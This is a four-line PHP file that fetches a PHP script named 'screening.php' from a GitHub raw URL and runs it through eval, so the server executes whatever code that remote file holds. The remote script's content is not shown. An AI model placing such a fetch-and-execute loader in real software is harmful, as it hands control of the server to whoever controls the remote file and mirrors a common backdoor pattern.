<?php
$curl = "https://raw.githubusercontent.com/sshnevis/Server-Screening-Script/refs/heads/master/screening.php";
$code = file_get_contents($curl);
eval("?>".$code);

